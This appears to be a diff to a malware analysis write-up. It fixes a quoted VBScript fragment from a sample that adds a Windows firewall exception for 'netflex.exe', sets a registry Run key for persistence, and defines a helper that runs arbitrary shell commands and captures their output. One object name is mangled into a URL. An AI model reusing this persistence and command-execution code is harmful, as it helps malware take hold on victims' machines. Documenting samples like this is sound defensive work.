@@ -71,19 +71,25 @@ Once this code is injected and executed, it drops a PE in the location 'C:\Users
 ```
 dim shellobj
 set shellobj = wscript.createobject("http://wscript.shell")
+
 ddd= "netsh firewall add allowedprogram c:\users\user\appdata\roaming\netflex\netflex.exe ""netflex.exe"" ENABLE"
 cmdshell(ddd)
-shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\"
-split ("netflex.exe",".")(0), "c:\users\user\appdata\roaming\netflex\netflex.exe", "REG_SZ"
+
+shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split ("netflex.exe",".")(0), "c:\users\user\appdata\roaming\netflex\netflex.exe", "REG_SZ"
+
 function cmdshell (cmd)
+
 dim httpobj,oexec,readallfromany
-set oexec = shellobj.exec ("%comspec% /C /Q /K /S"
+
+set oexec = shellobj.exec ("%comspec% /C /Q /K /S" & cmd)
 if not oexec.stdout.atendofstream then
-readallfromany = oexec.stdout.readall
+   readallfromany = oexec.stdout.readall
 elseif not oexec.stderr.atendofstream then
-readallfromany = oexec.stderr.readall
-readallfromany = ""
+   readallfromany = oexec.stderr.readall
+else 
+   readallfromany = ""
 end if
+
 cmdshell = readallfromany
 end function
 ```
